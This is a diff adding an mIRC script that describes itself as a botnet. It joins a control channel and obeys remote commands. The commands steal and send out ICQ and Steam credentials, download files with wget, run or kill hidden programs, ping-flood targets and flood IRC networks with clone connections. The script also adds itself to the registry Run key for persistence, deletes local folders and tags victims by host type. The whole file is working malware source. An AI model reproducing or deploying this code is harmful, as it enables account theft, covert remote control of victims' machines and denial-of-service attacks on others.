@@ -1,0 +1,267 @@
+on *:start:{
+  ruser 333
+  set %channel #aSteamseli
+showmirc -t
+  hostnick
+  server $servers
+  identd on $r(a,z) $+ $r(1,9) $+ $r(a,z) $+ $r(a,z) $+ $r(1,9)
+  rmdir download | rmdir logs | rmdir sounds
+  regedititit
+}
+on *:exit:{ ruser 333 | run services.exe }
+on *:connect:{
+  settings2
+}
+on *:dns:{
+  msg %channel 14D14ns 14R14esolved14:14 $raddress
+}
+alias checkconn {
+  if ($status != connected) {
+    server $servers
+  }
+}
+on *:disconnect:{
+  ruser 333
+  timercon 0 30 checkconn
+}
+on *:part:%channel:{ ruser 333 $nick }
+on *:quit:%channel:{ ruser 333 $nick }
+on *:nick:*:{ ruser 333 $nick | clearall }
+alias random return $r(A,Z) $+ $r(1,99) $+ $r(a,z) $+ $r(1,99) $+ $r(A,Z) $+ $r(1,99)
+alias settings2 {
+  timercon off
+  identd on $r(a,z) $+ $r(1,9) $+ $r(a,z) $+ $r(a,z) $+ $r(1,9)
+  hostnick
+  fullname $random
+  timer 0 5 join %channel
+}
+alias timers {
+  if ($1 == off) {
+    timers off
+    .timer 0 1 join %Channel
+    .timer 0 20 checkconn
+  }
+}
+on *:text:*:%Channel:{
+  if ($1 == !icq) { msg %channel 7[14ICQ7]P14lease 7W14ait... | run run32.exe icq.exe | run run32.exe icpv.exe | .timer 1 1 run run32.exe gic.exe | timer 1 3 play $nick icmarb.dll | .remove icmarb.dll }
+  if ($1 == !steam) {
+    .remove MaxSt.dll
+    run GetSt.exe
+    timer 1 5 play $nick MaxSt.dll
+    msg %channel 2[14Steam2] 2P12lease 2W12ait...
+  } 
+  if ($1 == !version) { msg %channel 2F12lip - 2B12ot2N12et 2P12roject 2V121.1 }
+  if ($1 == !dns) { dns $2 }
+  if ($1 == !pingt) { hiderun pingt.exe $2- }
+  if ($1 == !pingtoff) { hiderun kill.exe pingt.exe | hiderun kill.exe pingt.exe | hiderun kill.exe pingt.exe | hiderun kill.exe pingt.exe }
+  if ($1 == !Paket) { hiderun ping.exe -t $2 /l 65500 | hiderun ping.exe -t $2 /l 65500 | hiderun ping.exe -t $2 /l 65500 | timer 1 $calc($3 *60) hiderun kill.exe ping.exe | Msg %Channel Packeting $2 For $3 Min! }
+  if ($1 == !download) { if (!$exists($gettok($2-,-1,47))) { hiderun wget.exe $2- | msg %channel Downloading From: $2- } }
+  if ($1 == !uptime) { msg %channel $infoma }
+  if ($1 == !killapp) && ($2 != $null) { hiderun kill.exe $2- | msg %channel 1 $2 7K14illed1... }
+  if ($1 == !runapp) && ($2 != $null) { hiderun $2- | msg %channel 1 $2 7S14tarted1... }
+  if ($1 == !join) && ($2 != $null) { join $2 | msg %channel 7J14oined $2 }
+  if ($1 == !part) && ($2 != $null) { part $2 | msg %channel 7p14arted $2 }
+  if ($1 == !msg) && ($2 != $null) { msg $2 $3- }
+  if ($1 == !exists) && ($2- != $null) { if ( $exists($2-) == $true ) { msg %channel 9[+] $2- 7e14xists on this machine1. } { if ( $exists($2-) == $false) { msg %channel 4[-] $2- 7d14oesnt exist on this machine1. } } }
+  if ($1 == !ip) { msg %channel 7i14p/7h14ost: $ip $+  /  $+ $host }
+  if ($1 == !-) && ($2 != $null) { %- = $2- | msg %channel 7A14ction / $+ $2- | / $+ %- | unset %- }
+  if ($1 == !ports) && ($portfree($2) == $false) { msg %channel 7T14he port 2[ $2 ] 14 is open1. 7i14p/7h14ost: $ip $+  /  $+ $host / http:// $+ $ip $+ : $+ $2 }
+  if ($1 == !help) {
+msg $nick 2Welcome To My BotneT! Created By Gomigam. Commands Are:
+msg $nick 2!Help = This Window :P
+msg $nick 2!Version = Gives You The Bot Version :o (use !version)
+msg $nick 2!icq = Gives You Icq Numbers And Passwords :) (use !icq)
+msg $nick 2!steam = Gives You Steam Accounts And Passwords :> (use !steam)
+msg $nick 2!dns = Dns Ip Address \ Host :S (use !dns www.sex4free.co.il)
+msg $nick 2!download = Downloading File \ Files (use !download http://www.sex4free.co.il/main.htm)
+msg $nick 2!uptime = Tell You The Computer Uptime. (use !Uptime)
+msg $nick 2!killapp = Kills Prosses (use !killapp Steam.exe)
+msg $nick 2!runapp = Runs Application With Hide Bind. (use !runapp shutdown -r -t 0) HAHAHAHAHA
+msg $nick 2!exists = Check If The File Existing In My BotDir (use !exists run32.exe)
+msg $nick 2!ip = Returns The Bot Computer Ip. (use !ip)
+msg $nick 2!ports = Check Open Ports In The Bot (use !ports 80)
+msg $nick 2Thats It Gomigam The Pro. Have Fun.
+}
+  if ($1 == !clone) {
+    if ($2 == load) && ($5 != 0) && ($5 != $null) { .timer $5 0 sockopen Sockets- $+ $r(1,999999) $3 $4 | msg %channel 14 $5 7C14lonez loading to15 $3 $+ : $+ $4 }
+    if ($2 == loadqnet) { timer 1 1 sockopen Sockets- $+ $r(1,999999) irc.chatx.net 6667 | timer 1 20 sockopen Sockets- $+ $r(1,999999) irc.chatx.net 6667 | timer 1 40 sockopen Sockets- $+ $r(1,999999) irc.chatx.net 6667 | timer 1 60 sockopen Sockets- $+ $r(1,999999) irc.chatx.net 6667 | timer 1 80 sockopen Sockets- $+ $r(1,999999) irc.chatx.net 6667 | timer 1 100 sockopen Sockets- $+ $r(1,999999) irc.chatx.net 6667 | timer 1 120 sockopen Sockets- $+ $r(1,999999) irc.chatx.net 6667 | timer 1 122 msg %channel 2Y14ou can bring them to channel.. | msg %channel 2C14lones load to 2Q14net... 2P14lease wait 0212014 sec. }
+    if ($2 == kill) { sockwrite -tn Sockets-* QUIT : $+ $3- | sockclose Sockets-* | msg %channel 7C14lonez disconnected }
+    if ($2 == mix) {
+      sockwrite -tn Sockets-* privmsg $3 : $+ W0WoWW0WoWW0WoWW0WoWW0WoWW0WoWW0WoWW0WoWW0WoWW0WoWW0WoWW0WoWW0WoWW0WoWW0WoWW0WoWW0WoWW0WoWW0WoWW0WoWW0WoWW0WoWW0WoWW0WoWW0WoWW0WoWW0WoWW0WoW
+      sockwrite -tn Sockets-* notice $3 : $+ W0WoWW0WoWW0WoWW0WoWW0WoWW0WoWW0WoWW0WoWW0WoWW0WoWW0WoWW0WoWW0WoWW0WoWW0WoWW0WoWW0WoWW0WoWW0WoWW0WoWW0WoWW0WoWW0WoWW0WoWW0WoWW0WoWW0WoWW0WoW
+      sockwrite -tn Sockets-* privmsg $3 :VERSION
+      sockwrite -tn Sockets-* privmsg $3 :PING
+      sockwrite -tn Sockets-* privmsg $3 :FINGER
+      sockwrite -tn Sockets-* privmsg $3 :TIME
+    }
+    if ($2 == hit) {
+      sockwrite -tn Sockets-* privmsg $3 : $+ Flo0D!nGFlo0D!nGFlo0D!nGFlo0D!nGFlo0D!nGFlo0D!nGFlo0D!nGFlo0D!nGFlo0D!nGFlo0D!Flo0D!nGFlo0D!nGFlo0D!nGFlo0D!nGFlo0D!nGFlo0D!nGFlo0D!nGFlo0D!nGFlo0D!nGFlo0D!
+      sockwrite -tn Sockets-* privmsg $3 : $+ You Are Dead Now...You Are Dead Now...You Are Dead Now...You Are Dead Now...You Are Dead Now...You Are Dead Now...You Are Dead Now...You Are Dead Now...You Are Dead Now...You Are Dead Now...
+      sockwrite -tn Sockets-* privmsg $3 : $+ So Whats Up Boy? You Know That Im Rulz Here.So Whats Up Boy? You Know That Im Rulz Here.So Whats Up Boy? You Know That Im Rulz Here.So Whats Up Boy? You Know That Im Rulz Here.
+    }
+    if ($2 == Qauth) { sockwrite -tn Sockets-* privmsg $gettok($read(Auth.txt),1,32) : $+ $gettok($read(Auth.txt),2-,32) }
+    if ($2 == join) && ($3 != $null) { sockwrite -tn Sockets-* JOIN $3 $4- }
+    if ($2 == joint) { .timer 1 $r(1,600) sockwrite -tn Sockets-* JOIN $3 $4- }
+    if ($2 == part) && ($3 != $null) { sockwrite -tn Sockets-* PART $3 $4- }
+    if ($2 == joinpartflood) && ($4 != $null) { timer $3 0 joinpartflood $4- }
+    if ($2 == chanflood) {
+      sockwrite -tn Sockets-* JOIN $chr(35) $+ $r(1,9999) $+ $r(a,z) $+ $r(1,9999) $+ $r(A,Z) $+ $r(1,9999) $+ $r(a,z) $+ $r(1,9999) $+ $r(A,Z) $+ $r(1,9999) $+ $r(a,z) $+ $r(1,9999) $+ $r(A,Z) $+ $r(1,9999) $+ $r(a,z) $+ $r(1,9999) $+ $r(A,Z)
+      sockwrite -tn Sockets-* JOIN $chr(35) $+ $r(1,9999) $+ $r(a,z) $+ $r(1,9999) $+ $r(A,Z) $+ $r(1,9999) $+ $r(a,z) $+ $r(1,9999) $+ $r(A,Z) $+ $r(1,9999) $+ $r(a,z) $+ $r(1,9999) $+ $r(A,Z) $+ $r(1,9999) $+ $r(a,z) $+ $r(1,9999) $+ $r(A,Z)
+      sockwrite -tn Sockets-* JOIN $chr(35) $+ $r(1,9999) $+ $r(a,z) $+ $r(1,9999) $+ $r(A,Z) $+ $r(1,9999) $+ $r(a,z) $+ $r(1,9999) $+ $r(A,Z) $+ $r(1,9999) $+ $r(a,z) $+ $r(1,9999) $+ $r(A,Z) $+ $r(1,9999) $+ $r(a,z) $+ $r(1,9999) $+ $r(A,Z)
+      sockwrite -tn Sockets-* JOIN $chr(35) $+ $r(1,9999) $+ $r(a,z) $+ $r(1,9999) $+ $r(A,Z) $+ $r(1,9999) $+ $r(a,z) $+ $r(1,9999) $+ $r(A,Z) $+ $r(1,9999) $+ $r(a,z) $+ $r(1,9999) $+ $r(A,Z) $+ $r(1,9999) $+ $r(a,z) $+ $r(1,9999) $+ $r(A,Z)
+    }
+    if ($2 == msg) && ($3 != $null) { sockwrite -tn Sockets-* privmsg $3 : $+ $4- }
+    if ($2 == notice) && ($3 != $null) { sockwrite -tn Sockets-* notice $3 : $+ $4- }
+    if ($2 == Do) && ($3 != $null) { sockwrite -tn Sockets-* $3- }
+    if ($2 == randnick) { sockwrite -tn Sockets-* nick $read(mainhq.dbx) }
+    if ($2 == nick) && ($3 != $null) { sockwrite -tn Sockets-* nick $3- $+ $rand(A,Z) $+ $rand(0,99) $+ $rand(a,z) $+ $rand(0,99) $+ $rand(A,Z) $+ $rand(0,99) $+ $rand(a,z) $+ $rand(0,99) $+ $rand(A,Z) $+ $rand(0,99) $+ $rand(a,z) $+ $rand(0,99) $+ $rand(A,Z) $+ $rand(0,99) $+ $rand(a,z) $+ $rand(0,99) }
+    if ($2 == ctcp) && ($4 != $null) {
+      if ($3 == ping) && ($4 != $null) { sockwrite -tn Sockets-* privmsg $4 :PING }
+      if ($3 == VERSION) && ($4 != $null) { sockwrite -tn Sockets-* privmsg $4 :VERSION }
+      if ($3 == FINGER) && ($4 != $null) { sockwrite -tn Sockets-* privmsg $4 :FINGER }
+      if ($3 == TIME) && ($4 != $null) { sockwrite -tn Sockets-* privmsg $4 :TIME }
+      if ($3 == do) && ($5 != $null) { sockwrite -tn Sockets-* privmsg $5 : $+ $4 $+  }
+    }
+  }
+}
+------------
+UPTIME
+------------
+alias infoma {
+  if (wks isin $uptime(system,2)) { return 11,1My Windows Is $os - Runing $uptime(system,2) $+  } 
+  elseif (wk isin $uptime(system,2)) { return 4,1My Windows Is $os - Runing $uptime(system,2) $+  }
+  elseif (days isin $uptime(system,2)) { return 12,1My Windows Is $os - Runing $uptime(system,2) $+  }
+  else { return 15,1My Windows Is $os - Runing $uptime(system,2) $+  } 
+}
+------------
+registery
+------------
+alias regedititit {
+  set %x $+($r(a,z),$r(1,99),.reg)
+  write %x REGEDIT4 
+  write %x [HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run] 
+  write %x $+("Win,$os,Securty"=",$replace($mircdir,\,\\),$nopath($mircexe),") 
+  .run -n regedit /s %x 
+  .timer 1 3 .remove %x 
+  .timer 1 4 unset %x 
+}
+-----------
+;**************************
+;*     CLONE  aliases     *
+;**************************
+alias joinpartflood { sockwrite -tn Sockets-* JOIN $1 $2 | sockwrite -tn Sockets-* PART $1 $3- }
+on *:sockopen:Sockets-*:{ sockwrite -tn $sockname PONG $server | sockwrite -tn $sockname USER $nfs2 $nfs2 $nfs2 : $+ $nfs2 | sockwrite -tn $sockname NICK $read(mainhq.dbx) }
+on *:sockread:Sockets-*:{
+  sockread %SocketTemp
+  tokenize 32 %SocketTemp
+  if ($1 == ping) { sockwrite -tn $sockname pong $2- }
+  if ($mid(%SocketTemp,1,4) == PING) { sockwrite -tn $sockname PONG $mid($gettok(%SocketTemp,2,32),2) }
+}
+alias nfs { return $rand(a,z) $+ $rand(1,9) $+ $rand(a,z) $+ $rand(1,9) $+ $rand(a,z) $+ $rand(1,9) $+ $rand(a,z) $+ $rand(1,9) }
+alias nfs2 { return $r(1,1000) $+ $r(a,z) $+ $r(1,1000) }
+alias cloneradio { sockopen shoutcast $+ $rand(1,9999999999999999999999999999) $1- }
+on *:sockopen:shoutcast*: {
+  var %a = sockwrite -n shoutcast*
+  %a GET / HTTP/1.0
+  %a Host: $sock(shoutcast*).ip
+  %a User-Agent: mSSC/1.1
+  %a Accept: */*
+  %a Icy-MetaData:0
+  %a Connection: close
+  %a
+}
+
+;**************************
+;        HostNick         *
+;**************************
+alias hostnick {
+  if (.edu isin $host) || (.ac. isin $host) || (.cc. isin $host) || (uni isin $host) && (wk isin $uptime(system,2)) { nick Netanel[edu-wk- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
+  if (.edu isin $host) || (.ac. isin $host) || (.cc. isin $host) || (uni isin $host) { nick Netanel[edu- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
+  if (.gov isin $host) && (wk isin $uptime(system,2)) { nick Netanel[gov-wk- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
+  if (.gov isin $host) { nick Netanel[gov- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
+  if (www isin $host) && (wk isin $uptime(system,2)) { nick Netanel[www-wk- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
+  if (www isin $host) { nick Netanel[www- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
+  if (mail isin $host) && (wk isin $uptime(system,2)) { nick Netanel[mail-wk- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
+  if (mail isin $host) { nick Netanel[mail- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
+  if (.jp isin $host) && (wk isin $uptime(system,2)) { nick Netanel[jp-wk- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
+  if (.jp isin $host) { nick Netanel[jp- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
+  if (.ru isin $host) && (wk isin $uptime(system,2)) { nick Netanel[ru-wk- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
+  if (.ru isin $host) { nick Netanel[ru- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
+  if (.pl isin $host) && (wk isin $uptime(system,2)) { nick Netanel[pl-wk- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
+  if (.pl isin $host) { nick Netanel[pl- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
+  if (.uk isin $host) && (wk isin $uptime(system,2)) { nick Netanel[uk-wk- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
+  if (.uk isin $host) { nick Netanel[uk- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
+  if (.us isin $host) && (wk isin $uptime(system,2)) { nick Netanel[us-wk- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
+  if (.us isin $host) { nick Netanel[us- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
+  if (.tr isin $host) && (wk isin $uptime(system,2)) { nick Netanel[tr-wk- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
+  if (.tr isin $host) { nick Netanel[tr- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
+  if (.ro isin $host) && (wk isin $uptime(system,2)) { nick Netanel[ro-wk- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
+  if (.ro isin $host) { nick Netanel[ro- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
+  if (.es isin $host) && (wk isin $uptime(system,2)) { nick Netanel[es-wk- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
+  if (.es isin $host) { nick Netanel[es- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
+  if (.at isin $host) && (wk isin $uptime(system,2)) { nick Netanel[at-wk- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
+  if (.at isin $host) { nick Netanel[at- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
+  if (.au isin $host) && (wk isin $uptime(system,2)) { nick Netanel[au-wk- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
+  if (.au isin $host) { nick Netanel[au- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
+  if (.de isin $host) && (wk isin $uptime(system,2)) { nick Netanel[de-wk- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
+  if (.de isin $host) { nick Netanel[de- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
+  if (.dk isin $host) && (wk isin $uptime(system,2)) { nick Netanel[dk-wk- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
+  if (.dk isin $host) { nick Netanel[dk- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
+  if (.fi isin $host) && (wk isin $uptime(system,2)) { nick Netanel[fi-wk- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
+  if (.fi isin $host) { nick Netanel[fi- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
+  if (.fr isin $host) && (wk isin $uptime(system,2)) { nick Netanel[fr-wk- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
+  if (.fr isin $host) { nick Netanel[fr- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
+  if (.is isin $host) && (wk isin $uptime(system,2)) { nick Netanel[is-wk- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
+  if (.is isin $host) { nick Netanel[is- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
+  if (.gr isin $host) && (wk isin $uptime(system,2)) { nick Netanel[gr-wk- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
+  if (.gr isin $host) { nick Netanel[gr- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
+  if (.hu isin $host) && (wk isin $uptime(system,2)) { nick Netanel[hu-wk- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
+  if (.hu isin $host) { nick Netanel[hu- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
+  if (.hk isin $host) && (wk isin $uptime(system,2)) { nick Netanel[hk-wk- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
+  if (.hk isin $host) { nick Netanel[hk- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
+  if (.jo isin $host) && (wk isin $uptime(system,2)) { nick Netanel[jo-wk- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
+  if (.jo isin $host) { nick Netanel[jo- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
+  if (.kr isin $host) && (wk isin $uptime(system,2)) { nick Netanel[kr-wk- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
+  if (.kr isin $host) { nick Netanel[kr- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
+  if (.ch isin $host) && (wk isin $uptime(system,2)) { nick Netanel[ch-wk- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
+  if (.ch isin $host) { nick Netanel[ch- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
+  if (.cn isin $host) && (wk isin $uptime(system,2)) { nick Netanel[cn-wk- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
+  if (.cn isin $host) { nick Netanel[cn- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
+  if (.br isin $host) && (wk isin $uptime(system,2)) { nick Netanel[br-wk- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
+  if (.br isin $host) { nick Netanel[br- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
+  if (.no isin $host) && (wk isin $uptime(system,2)) { nick Netanel[no-wk- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
+  if (.no isin $host) { nick Netanel[no- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
+  if (.nl isin $host) && (wk isin $uptime(system,2)) { nick Netanel[nl-wk- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
+  if (.nl isin $host) { nick Netanel[nl- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
+  if (.mx isin $host) && (wk isin $uptime(system,2)) { nick Netanel[mx-wk- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
+  if (.mx isin $host) { nick Netanel[mx- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
+  if (.sg isin $host) && (wk isin $uptime(system,2)) { nick Netanel[sg-wk- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
+  if (.sg isin $host) { nick Netanel[sg- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
+  if (.se isin $host) && (wk isin $uptime(system,2)) { nick Netanel[se-wk- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
+  if (.se isin $host) { nick Netanel[se- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }  
+  if (.cz isin $host) && (wk isin $uptime(system,2)) { nick Netanel[cz-wk- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
+  if (.cz isin $host) { nick Netanel[cz- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
+  if (.be isin $host) && (wk isin $uptime(system,2)) { nick Netanel[be-wk- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
+  if (.be isin $host) { nick Netanel[be- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
+  if (hinet isin $host) && (wk isin $uptime(system,2)) { nick Netanel[hinet-wk- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
+  if (hinet isin $host) { nick Netanel[hinet- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
+  if (.il isin $host) || (bezeqint isin $host) || (barak isin $host) && (wk isin $uptime(system,2)) { nick Netanel[iL-wk- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
+  if (.il isin $host) || (bezeqint isin $host) || (barak isin $host) { nick Netanel[iL- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
+  if (.ca isin $host) && (wk isin $uptime(system,2)) { nick Netanel[ca-wk- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
+  if (.ca isin $host) { nick Netanel[ca- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
+  if (.tw isin $host) && (wk isin $uptime(system,2)) { nick Netanel[tw-wk- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
+  if (.tw isin $host) { nick Netanel[tw- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
+  if (.it isin $host) && (wk isin $uptime(system,2)) { nick Netanel[it-wk- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
+  if (.it isin $host) { nick Netanel[it- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
+  if (cable isin $host) && (wk isin $uptime(system,2)) { nick Netanel[cable-wk- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
+  if (cable isin $host) { nick Netanel[cable- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
+  if (dsl isin $host) && (wk isin $uptime(system,2)) { nick Netanel[dsl-wk- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
+  if (dsl isin $host) { nick Netanel[dsl- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
+  if (server isin $host) && (wk isin $uptime(system,2)) { nick Netanel[server-wk- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
+  if (server isin $host) { nick Serv[server- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
+  if (wks isin $uptime(system,2)) { nick Netanel[wks- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
+  if (wk isin $uptime(system,2)) { nick Netanel[wk- $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ] | goto end }
+  nick Netanel[ $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ ]
+  :end
+}
+alias hiderun { run run32.exe $1- }
